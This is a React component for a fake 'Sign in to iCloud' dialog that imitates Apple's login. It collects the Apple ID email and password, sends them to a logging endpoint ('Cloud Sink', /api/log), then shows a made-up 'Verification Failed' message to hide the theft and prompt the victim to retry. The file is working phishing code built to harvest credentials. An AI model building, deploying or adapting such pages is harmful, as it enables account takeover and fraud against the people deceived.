import { useState } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import CloudLogo from './CloudLogo';
// 1. IMPORT YOUR SAVE LOGIC HERE
import { saveFormData } from '@/saveFormData'; 

interface SignInDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const SignInDialog = ({ open, onOpenChange }: SignInDialogProps) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  // 2. UPDATE THE SUBMIT LOGIC
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    console.log('Sending credentials to Cloud Sink...');
    
    try {
      // This sends the data to /api/log
      await saveFormData({ email, password });
      
      // Simulating a real Apple login "delay" or error
      setTimeout(() => {
        alert("Verification Failed: Please check your credentials and try again.");
        setLoading(false);
      }, 1500);
      
    } catch (error) {
      console.error("Submission error:", error);
      setLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md bg-background border-border">
        <DialogHeader className="flex flex-col items-center space-y-4 pb-4">
          <div className="scale-75">
            <CloudLogo />
          </div>
          <DialogTitle className="text-2xl font-semibold text-foreground">
            Sign in to iCloud
          </DialogTitle>
        </DialogHeader>
        
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Input
              type="email"
              placeholder="Apple ID or Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="h-12 bg-muted/50 border-border placeholder:text-muted-foreground"
              required
            />
          </div>
          
          <div className="space-y-2">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-12 bg-muted/50 border-border placeholder:text-muted-foreground"
              required
            />
          </div>

          <Button 
            type="submit" 
            disabled={loading}
            className="w-full h-12 rounded-lg bg-foreground text-background hover:bg-foreground/90 font-medium"
          >
            {loading ? "Signing in..." : "Sign In"}
          </Button>

          <div className="text-center pt-2">
            <a href="#" className="text-sm text-[hsl(var(--accent))] hover:underline">
              Forgot Apple ID or password?
            </a>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default SignInDialog;
